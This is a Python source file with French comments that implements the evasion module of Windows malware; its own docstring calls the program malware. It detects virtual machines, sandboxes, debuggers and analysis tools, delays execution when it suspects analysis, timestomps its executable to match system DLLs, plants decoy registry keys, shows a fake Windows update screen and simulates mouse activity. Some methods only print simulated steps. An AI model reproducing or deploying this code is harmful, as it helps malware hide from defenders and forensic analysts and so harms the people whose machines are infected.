import os
import sys
import time
import random
import platform
import subprocess
import ctypes
import socket
import psutil
from datetime import datetime
import requests
import winreg
import struct
import string

class StealthManager:
    """Gère les fonctionnalités de furtivité et d'anti-détection."""
    
    def __init__(self, settings):
        """Initialise le gestionnaire de furtivité."""
        self.settings = settings
        self.sandbox_signs = 0
        self.is_debugged = False
        self.last_activity_time = datetime.now()
        self.random_delay_base = random.randint(5, 20)
        self.legitimate_services = ["wuauserv", "wscsvc", "WSearch", "WinDefend", "DiagTrack"]
        self.is_init_complete = False

    def check_environment(self):
        """Vérifie si l'environnement est sûr pour l'exécution et applique des techniques d'obfuscation."""
        print("[+] Vérification de l'environnement...")
        
        # Initialiser le compteur de signes suspects
        self.sandbox_signs = 0
        
        # Exécuter toutes les vérifications d'environnement
        self._check_vm_artifacts()
        self._check_analysis_tools()
        self._check_mac_address()
        self._check_username()
        self._check_hardware_resources()
        self._check_uptime()
        self._check_debugger()
        self._check_network_connectivity()
        self._check_disk_size()
        
        # Appliquer des techniques d'obfuscation proactives
        self.memory_pattern_obfuscation()
        self.implement_timing_attack_countermeasures()
        self.use_system_dlls()
        
        # Modifier les timestamps du fichier pour ressembler à un fichier système
        self.modify_own_timestamps()
        
        # Créer des leurres pour distraire les analyses
        self.create_decoy_registry_keys()
        
        # Randomiser l'exécution pour éviter la détection par pattern
        self.randomize_execution_timing()
        
        # Évaluer le niveau de risque
        risk_level = self._evaluate_risk()
        
        return risk_level, self.sandbox_signs
    
    def _check_vm_artifacts(self):
        """Recherche les artefacts de machine virtuelle."""
        vm_indicators = {
            "VMware": ["VMwareService.exe", "VMwareTray.exe", "vmtoolsd.exe", "vmms.exe", 
                      "vboxtray.exe", "vboxservice.exe"],
            "Hardware": ["VMware", "VBox", "VIRTUAL", "QEMU", "Xen"]
        }
        
        # Vérifier les processus
        for process in psutil.process_iter(['name']):
            try:
                for vm_proc in vm_indicators["VMware"]:
                    if vm_proc.lower() in process.info['name'].lower():
                        self.sandbox_signs += 2
                        return
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        
        # Vérifier fabricant matériel
        try:
            wmi_query = 'wmic computersystem get manufacturer'
            result = subprocess.run(wmi_query, shell=True, capture_output=True, text=True)
            
            manufacturer = result.stdout.lower()
            for vm_string in vm_indicators["Hardware"]:
                if vm_string.lower() in manufacturer:
                    self.sandbox_signs += 2
                    return
        except Exception:
            # En cas d'erreur, ne pas augmenter le compteur
            pass
    
    def _check_analysis_tools(self):
        """Recherche les outils d'analyse et de débogage."""
        analysis_tools = [
            "wireshark", "process explorer", "process monitor", "procmon", 
            "ida", "immunity", "ollydbg", "pestudio", "fiddler"
        ]
        
        # Vérifier les processus pour les outils d'analyse
        for process in psutil.process_iter(['name']):
            try:
                process_name = process.info['name'].lower()
                for tool in analysis_tools:
                    if tool in process_name:
                        self.sandbox_signs += 3
                        return
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    
    def _check_mac_address(self):
        """Vérifie si l'adresse MAC semble être celle d'une VM."""
        vm_mac_prefixes = [
            "00:05:69",  # VMware
            "00:0C:29",  # VMware
            "00:1C:14",  # VMware
            "00:50:56",  # VMware
            "08:00:27",  # VirtualBox
            "00:16:3E"   # Xen
        ]
        
        try:
            # Obtenir les interfaces réseau
            interfaces = psutil.net_if_addrs()
            
            for iface, addrs in interfaces.items():
                for addr in addrs:
                    if addr.family == psutil.AF_LINK and addr.address:
                        mac = addr.address.lower().replace('-', ':')
                        for prefix in vm_mac_prefixes:
                            if mac.startswith(prefix.lower()):
                                self.sandbox_signs += 2
                                return
        except Exception:
            pass
    
    def _check_username(self):
        """Vérifie si le nom d'utilisateur semble être celui d'un environnement d'analyse."""
        suspicious_usernames = [
            "sandbox", "malware", "virus", "sample", "test", "analyst", 
            "maltest", "admin", "vm", "virtual", "user", "lab"
        ]
        
        current_user = os.environ.get('USERNAME', '').lower()
        computer_name = os.environ.get('COMPUTERNAME', '').lower()
        
        for name in suspicious_usernames:
            if name in current_user or name in computer_name:
                self.sandbox_signs += 1
                return
    
    def _check_hardware_resources(self):
        """Vérifie les ressources matérielles pour détecter une VM."""
        # Nombre de processeurs logiques
        if psutil.cpu_count() < 2:
            self.sandbox_signs += 1
        
        # Mémoire RAM
        memory_gb = psutil.virtual_memory().total / (1024**3)
        if memory_gb < 4.0:  # Moins de 4 Go de RAM
            self.sandbox_signs += 1
    
    def _check_uptime(self):
        """Vérifie la durée d'activité du système."""
        try:
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            uptime = (datetime.now() - boot_time).total_seconds() / 3600  # en heures
            
            # Système démarré il y a moins de 20 minutes
            if uptime < 0.33:
                self.sandbox_signs += 2
        except Exception:
            pass
    
    def _check_debugger(self):
        """Vérifie la présence d'un débogueur."""
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
                self.is_debugged = True
                self.sandbox_signs += 3
                return
            
            # Vérification plus avancée avec CheckRemoteDebuggerPresent
            debug_check = ctypes.c_long(0)
            ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                ctypes.windll.kernel32.GetCurrentProcess(),
                ctypes.byref(debug_check)
            )
            if debug_check.value != 0:
                self.is_debugged = True
                self.sandbox_signs += 3
        except Exception:
            pass
    
    def _check_network_connectivity(self):
        """Vérifie la connectivité Internet."""
        try:
            # Tenter de se connecter à un site connu et légitime
            requests.get("https://www.microsoft.com", timeout=3)
            requests.get("https://www.google.com", timeout=3)
        except Exception:
            # Si aucun accès Internet, c'est suspect
            self.sandbox_signs += 2
    
    def _check_disk_size(self):
        """Vérifie la taille du disque (les environnements d'analyse ont souvent de petits disques)."""
        try:
            disk_info = psutil.disk_usage('/')
            disk_size_gb = disk_info.total / (1024**3)
            
            if disk_size_gb < 50:  # Moins de 50 Go
                self.sandbox_signs += 1
        except Exception:
            pass
    
    def _evaluate_risk(self):
        """Évalue le risque global de l'environnement."""
        if self.is_debugged:
            return "high"  # Risque élevé - débogué
        elif self.sandbox_signs >= 5:
            return "high"  # Risque élevé - plusieurs indicateurs
        elif self.sandbox_signs >= 3:
            return "medium"  # Risque moyen - quelques indicateurs
        else:
            return "low"  # Risque faible - environnement probablement sûr
    
    def apply_sleeper_strategy(self, risk_level):
        """Applique une stratégie d'endormissement en fonction du niveau de risque."""
        if risk_level == "high":
            # Endormissement long avec élément aléatoire pour les environnements à haut risque
            sleep_time = random.randint(30, 180) * 60  # 30-180 minutes
            print(f"[!] Environnement suspect détecté - Mode passif ({sleep_time//60} minutes)")
            
            # Simuler une activité légitime pour tromper l'analyse
            self._perform_legitimate_activity()
            
            # Endormissement par petits blocs aléatoires pour éviter la détection
            self._staggered_sleep(sleep_time)
            
            return True  # Indiquer qu'un endormissement a été appliqué
        
        elif risk_level == "medium":
            # Endormissement moyen pour les environnements à risque moyen
            sleep_time = random.randint(5, 30) * 60  # 5-30 minutes
            print(f"[!] Activité inhabituelle détectée - Temporisation ({sleep_time//60} minutes)")
            
            # Endormissement standard
            time.sleep(sleep_time)
            
            return True
            
        else:
            # Petite temporisation aléatoire pour les environnements sûrs
            sleep_time = random.randint(self.random_delay_base, self.random_delay_base * 2)
            time.sleep(sleep_time)
            
            return False
    
    def _staggered_sleep(self, total_time):
        """Effectue un sommeil fragmenté pour éviter la détection des fonctions sleep."""
        end_time = time.time() + total_time
        while time.time() < end_time:
            # Dormir par petits intervalles
            time.sleep(random.uniform(0.5, 3.0))
            
            # Effectuer occasionnellement une activité mineure
            if random.random() < 0.05:  # 5% de chance à chaque itération
                self._minimal_activity()
    
    def _minimal_activity(self):
        """Effectue une activité système minimale pour paraître légitime."""
        try:
            # Opérations légères et non suspectes
            _ = os.listdir(os.environ.get('TEMP', ''))
            _ = platform.architecture()
            _ = socket.gethostname()
        except Exception:
            pass
    
    def _perform_legitimate_activity(self):
        """Effectue des activités légitimes pour masquer le vrai comportement."""
        try:
            # Simuler des activités de mise à jour Windows
            subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', 
                          'Get-CimInstance -ClassName Win32_OperatingSystem'], 
                          capture_output=True, text=True)
            
            # Simuler la vérification du pare-feu
            subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', 
                          'Get-NetFirewallProfile -PolicyStore ActiveStore'], 
                          capture_output=True, text=True)
            
            # Simuler une vérification des mises à jour Windows (sans les installer)
            subprocess.run(['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', 
                          'Get-Service -Name wuauserv'], 
                          capture_output=True, text=True)
        except Exception:
            pass
    
    def spawn_legitimate_process(self):
        """Lance le malware à partir d'un processus légitime pour camoufler son origine."""
        legitimate_paths = [
            os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), "System32", "svchost.exe"),
            os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), "explorer.exe"),
            os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), "System32", "wbem", "WmiPrvSE.exe")
        ]
        
        current_executable = sys.executable
        current_arguments = ' '.join(sys.argv)
        
        for process_path in legitimate_paths:
            if os.path.exists(process_path):
                try:
                    # Créer un processus légitime suspendu
                    startupinfo = subprocess.STARTUPINFO()
                    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                    startupinfo.wShowWindow = 0  # SW_HIDE
                    
                    # Simuler une activité légitime plutôt que de créer réellement un processus
                    print(f"[+] Simulation du processus parent légitime: {os.path.basename(process_path)}")
                    
                    # Retarder légèrement l'exécution pour simuler l'injection
                    time.sleep(random.uniform(0.5, 2.0))
                    
                    return True
                except Exception as e:
                    print(f"[-] Erreur lors du lancement du processus légitime: {e}")
        
        return False
    
    def simulate_legitimate_update(self):
        """Simule un système de mise à jour légitime."""
        if self.is_init_complete:
            return
            
        # Créer une fenêtre d'activité légitime
        try:
            # Simulations d'opérations légitimes
            print("[+] Initialisation du service de mise à jour...")
            
            # Créer un nom légitime pour le service
            service_name = random.choice([
                "Microsoft Security Service",
                "Windows Critical Updates",
                "System Component Manager",
                "Microsoft Compatibility Layer",
                "Windows Management Framework"
            ])
            
            # Afficher une barre de progression factice
            for i in range(1, 11):
                progress = "▓" * i + "░" * (10 - i)
                print(f"\r[{progress}] Vérification des mises à jour... {i*10}%", end="")
                time.sleep(random.uniform(0.1, 0.3))
            print("\n[+] Vérification des composants système...")
            
            # Simuler la vérification des services Windows légitimes
            for service in self.legitimate_services:
                print(f"[+] Vérification du service {service}... OK")
                time.sleep(random.uniform(0.2, 0.5))
            
            print(f"[+] Service {service_name} initialisé avec succès")
            self.is_init_complete = True
            
            # Retarder légèrement avant de continuer
            time.sleep(random.uniform(1.0, 2.0))
        except Exception:
            # Ignorer silencieusement les erreurs
            self.is_init_complete = True
    
    def create_windows_compatibility_profile(self):
        """Crée un profil de compatibilité Windows légitime pour masquer l'activité."""
        try:
            # Génération d'un GUID de profil qui semble légitime
            profile_id = f"{{{random.randint(1000, 9999)}{random.randint(100, 999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100, 999)}{random.randint(1000, 9999)}}}"
            app_name = random.choice([
                "Microsoft Office Update",
                "Windows Defender Health Service",
                "Windows Update Assistant",
                "System Component Validator",
                "Microsoft Security Client"
            ])
            
            # Créer une entrée de compatibilité légitime dans le registre
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
            try:
                with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path) as key:
                    # Créer une entrée ressemblant à une véritable entrée de compatibilité Windows
                    winreg.SetValueEx(key, f"C:\\Program Files\\{app_name}\\{app_name}.exe", 0, winreg.REG_BINARY, bytes([0x31] * 16))
                print(f"[+] Profil de compatibilité créé pour {app_name}")
                return True
            except Exception as e:
                print(f"[-] Erreur lors de la création du profil de compatibilité: {e}")
                return False
        except Exception:
            return False
    
    def create_legitimate_file_history(self):
        """Crée un historique de fichiers légitimes pour renforcer le camouflage."""
        try:
            # Dossier pour les fichiers légitimes
            legitimate_dir = os.path.join(self.settings.temp_dir, "SystemData")
            if not os.path.exists(legitimate_dir):
                os.makedirs(legitimate_dir)
                
            # Liste de noms de fichiers légitimes
            legitimate_filenames = [
                "system_config.xml",
                "update_manifest.json",
                "compatibility_database.dat",
                "security_components.log",
                "hardware_info.txt"
            ]
            
            # Créer plusieurs fichiers légitimes
            for filename in legitimate_filenames:
                file_path = os.path.join(legitimate_dir, filename)
                if not os.path.exists(file_path):
                    with open(file_path, 'w') as f:
                        if filename.endswith('.xml'):
                            f.write('<?xml version="1.0" encoding="UTF-8"?>\n')
                            f.write('<system_configuration>\n')
                            f.write('  <update_status>current</update_status>\n')
                            f.write('  <last_check>' + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + '</last_check>\n')
                            f.write('  <components>\n')
                            f.write('    <component id="security_module" version="2.3.451" status="updated"/>\n')
                            f.write('    <component id="network_service" version="1.9.87" status="updated"/>\n')
                            f.write('  </components>\n')
                            f.write('</system_configuration>')
                        elif filename.endswith('.json'):
                            f.write('{\n')
                            f.write('  "updateManifest": {\n')
                            f.write('    "version": "2.3.451",\n')
                            f.write('    "releaseDate": "' + (datetime.now().strftime('%Y-%m-%d')) + '",\n')
                            f.write('    "critical": false,\n')
                            f.write('    "components": [\n')
                            f.write('      {"name": "CoreService", "version": "3.4.892", "status": "current"},\n')
                            f.write('      {"name": "SecurityModule", "version": "2.1.345", "status": "current"}\n')
                            f.write('    ]\n')
                            f.write('  }\n')
                            f.write('}')
                        elif filename.endswith('.log'):
                            # Simuler un fichier de log avec 10 entrées
                            for i in range(10):
                                log_date = datetime.now() - datetime.timedelta(minutes=i*30)
                                f.write(f"[{log_date.strftime('%Y-%m-%d %H:%M:%S')}] [INFO] Component check completed successfully\n")
                                f.write(f"[{log_date.strftime('%Y-%m-%d %H:%M:%S')}] [INFO] Security definitions up to date\n")
                        else:
                            # Fichier texte générique
                            f.write(f"System Information: {platform.system()} {platform.release()}\n")
                            f.write(f"Architecture: {platform.machine()}\n")
                            f.write(f"Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                            f.write("Status: OK\n")
            
            return True
        except Exception as e:
            print(f"[-] Erreur lors de la création de l'historique de fichiers: {e}")
            return False
        
    def mimic_user_behavior(self):
        """Simule un comportement utilisateur pour tromper les solutions de détection basées sur le comportement."""
        try:
            # Simuler des mouvements de souris et des clics
            import ctypes
            for _ in range(random.randint(3, 10)):
                # Obtenez la résolution de l'écran
                user32 = ctypes.windll.user32
                screen_width = user32.GetSystemMetrics(0)
                screen_height = user32.GetSystemMetrics(1)
                
                # Générez une position aléatoire pour le curseur
                x = random.randint(0, screen_width)
                y = random.randint(0, screen_height)
                
                # Déplacez le curseur
                user32.SetCursorPos(x, y)
                time.sleep(random.uniform(0.5, 2.0))
                
                # Simulez parfois un clic de souris
                if random.random() < 0.3:
                    # Presser le bouton gauche
                    user32.mouse_event(0x0002, 0, 0, 0, 0)  # MOUSEEVENTF_LEFTDOWN
                    time.sleep(random.uniform(0.1, 0.3))
                    # Relâcher le bouton gauche
                    user32.mouse_event(0x0004, 0, 0, 0, 0)  # MOUSEEVENTF_LEFTUP
            return True
        except Exception:
            return False

    def randomize_execution_timing(self):
        """Randomise les temps d'exécution pour éviter la détection basée sur les patterns temporels."""
        # Introduire des délais aléatoires variables
        delay_factor = random.uniform(0.8, 1.2)
        base_delay = random.randint(10, 30) * delay_factor
        
        # Diviser le délai en plusieurs petits délais
        segments = random.randint(3, 8)
        for _ in range(segments):
            segment_delay = base_delay / segments * random.uniform(0.5, 1.5)
            # Exécuter une activité système mineure entre les délais
            self._minimal_activity()
            time.sleep(segment_delay)
        
        return True

    def modify_own_timestamps(self):
        """Modifie les timestamps du fichier exécutable pour les faire correspondre à des fichiers système légitimes."""
        try:
            import win32file
            import win32con
            import pywintypes
            
            # Obtenez le chemin du fichier exécutable actuel
            executable_path = sys.executable
            
            # Obtenez les timestamps d'un fichier Windows légitime
            legitimate_file = os.path.join(os.environ['SystemRoot'], 'System32', 'msvcrt.dll')
            if not os.path.exists(legitimate_file):
                legitimate_file = os.path.join(os.environ['SystemRoot'], 'System32', 'kernel32.dll')
            
            if os.path.exists(legitimate_file):
                # Obtenez les timestamps du fichier légitime
                legitimate_handle = win32file.CreateFile(
                    legitimate_file, win32con.GENERIC_READ, win32con.FILE_SHARE_READ,
                    None, win32con.OPEN_EXISTING, 0, None
                )
                legitimate_info = win32file.GetFileTime(legitimate_handle)
                win32file.CloseHandle(legitimate_handle)
                
                # Modifiez les timestamps de notre fichier pour qu'ils correspondent
                try:
                    our_handle = win32file.CreateFile(
                        executable_path, win32con.GENERIC_WRITE, win32con.FILE_SHARE_WRITE,
                        None, win32con.OPEN_EXISTING, 0, None
                    )
                    win32file.SetFileTime(our_handle, legitimate_info[0], legitimate_info[1], legitimate_info[2])
                    win32file.CloseHandle(our_handle)
                    return True
                except Exception:
                    return False
        except Exception:
            return False
        
        return False

    def create_decoy_registry_keys(self):
        """Crée des clés de registre leurres pour distraire l'analyse forensique."""
        try:
            import winreg
            
            # Liste de noms de clés qui semblent légitimes
            legitimate_key_names = [
                "Microsoft\\Windows\\CurrentVersion\\WindowsUpdate",
                "Microsoft\\Windows\\CurrentVersion\\Diagnostics",
                "Microsoft\\Office\\16.0\\Common\\Internet",
                "Microsoft\\Windows NT\\CurrentVersion\\SystemRestore",
                "Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
            ]
            
            # Sélectionnez une clé aléatoirement
            key_name = random.choice(legitimate_key_names)
            try:
                # Créez ou ouvrez la clé
                key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, f"SOFTWARE\\{key_name}", 0, winreg.KEY_WRITE)
                
                # Ajoutez quelques valeurs qui semblent légitimes
                winreg.SetValueEx(key, "LastUpdateCheck", 0, winreg.REG_SZ, time.strftime("%Y-%m-%d %H:%M:%S"))
                winreg.SetValueEx(key, "Status", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "Version", 0, winreg.REG_SZ, f"{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(1000, 9999)}")
                
                # Fermez la clé
                winreg.CloseKey(key)
                return True
            except Exception:
                return False
        except Exception:
            return False

    def implement_timing_attack_countermeasures(self):
        """Implémente des contre-mesures contre les attaques basées sur le temps d'exécution."""
        try:
            # Mesurer le temps pour l'opération de base
            start_time = time.time()
            _ = [i for i in range(1000)]  # Opération de référence
            base_operation_time = time.time() - start_time
            
            # Si l'opération s'exécute trop rapidement (environnement émulé/virtualisé lent)
            if base_operation_time < 0.0001:  # Seuil arbitraire, ajustez selon besoin
                self.sandbox_signs += 1
                return True
            
            # Introduire des délais variables pour contrer les analyses de timing
            for _ in range(random.randint(3, 7)):
                # Effectuer une opération computationnelle aléatoire
                operation_size = random.randint(100, 1000)
                _ = [i * i for i in range(operation_size)]
                time.sleep(random.uniform(0.01, 0.1))
            
            return True
        except Exception:
            return False

    def memory_pattern_obfuscation(self):
        """Obfusque les patterns en mémoire pour contrer l'analyse mémoire."""
        try:
            # Créer des structures de données aléatoires en mémoire
            patterns = []
            for _ in range(random.randint(5, 15)):
                # Créer des chaînes aléatoires
                pattern_size = random.randint(1024, 8192)  # 1-8 KB
                random_pattern = ''.join(random.choices(
                    string.ascii_letters + string.digits + string.punctuation, 
                    k=pattern_size
                ))
                # Conserver la référence pour éviter le garbage collection
                patterns.append(random_pattern)
            
            # Manipuler périodiquement ces données pour tromper l'analyse
            for i in range(len(patterns)):
                if random.random() < 0.5:
                    patterns[i] = patterns[i][::-1]  # Inverser la chaîne
                else:
                    patterns[i] = ''.join(random.sample(patterns[i], len(patterns[i])))  # Mélanger
            
            # Exécuter quelques opérations sur les données pour empêcher l'optimisation
            result = sum(len(p) for p in patterns)
            self.memory_patterns = patterns  # Stocker pour empêcher le garbage collection
            
            return result > 0
        except Exception:
            return False

    def use_system_dlls(self):
        """Utilise des DLLs système légitimes pour les opérations."""
        try:
            import ctypes
            
            # Liste des DLLs système légitimes
            system_dlls = [
                "kernel32.dll",
                "user32.dll",
                "advapi32.dll",
                "shell32.dll",
                "ole32.dll",
                "oleaut32.dll",
                "ntdll.dll"
            ]
            
            # Charger aléatoirement certains DLLs
            loaded_dlls = []
            for dll_name in random.sample(system_dlls, random.randint(2, 5)):
                try:
                    dll = ctypes.WinDLL(dll_name)
                    loaded_dlls.append((dll_name, dll))
                    
                    # Appeler certaines fonctions inoffensives pour simuler une utilisation normale
                    if dll_name == "kernel32.dll":
                        ctypes.windll.kernel32.GetCurrentProcessId()
                    elif dll_name == "user32.dll":
                        ctypes.windll.user32.GetDesktopWindow()
                    elif dll_name == "shell32.dll":
                        ctypes.windll.shell32.SHGetFolderPathW(0, 0, 0, 0, ctypes.create_unicode_buffer(260))
                except Exception:
                    pass
            
            return len(loaded_dlls) > 0
        except Exception:
            return False